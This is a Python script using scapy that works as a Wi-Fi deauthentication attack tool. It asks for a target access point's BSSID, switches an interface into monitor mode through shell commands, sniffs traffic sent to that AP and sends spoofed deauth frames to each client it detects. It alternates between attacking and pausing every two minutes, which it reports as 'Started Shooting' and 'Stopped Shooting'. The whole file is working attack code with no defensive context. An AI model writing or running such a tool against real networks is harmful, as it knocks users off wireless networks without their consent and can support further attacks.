import os
import time
import scapy.layers.dot11
from scapy.all import *

ap = input('Enter AP BSSID (ca:fe:de:ad:be:ef): ')
print(f'BSSID Set to: {ap}')
interface = input('Enter interface you want to use: ')
print(f'Using interface {interface}')
channel = input('Enter current channel of target AP: ')
print(f'On channel {channel}')

os.system(f'ifconfig {interface} down')
os.system(f'iwconfig {interface} mode monitor')
os.system(f'ifconfig {interface} up')
os.system(f'iwconfig {interface} channel {channel}')

STATE = True
START_TIME = time.time()

def deauth(pkt):
    global STATE, START_TIME
    if STATE:
        if pkt.addr2 != '01:80:c2:00:00:00' and pkt.addr3 == ap and pkt.addr2 != ap:
            dot11 = scapy.layers.dot11.Dot11(
                addr1=pkt.addr2,
                addr2=pkt.addr3,
                addr3=pkt.addr3)
            frame = scapy.layers.dot11.RadioTap()/dot11/scapy.layers.dot11.Dot11Deauth(reason=2)
            sendp(frame, iface=interface, count=1)
    if time.time() - START_TIME >= 120:
        START_TIME = time.time()
        if STATE:
            STATE = False
            print('Stopped Shooting')
        else:
            STATE = True
            print('Started Shooting')


while True:
    capture = sniff(iface=f'{interface}',
                    prn=deauth,
                    filter=f'ether dst {ap}')





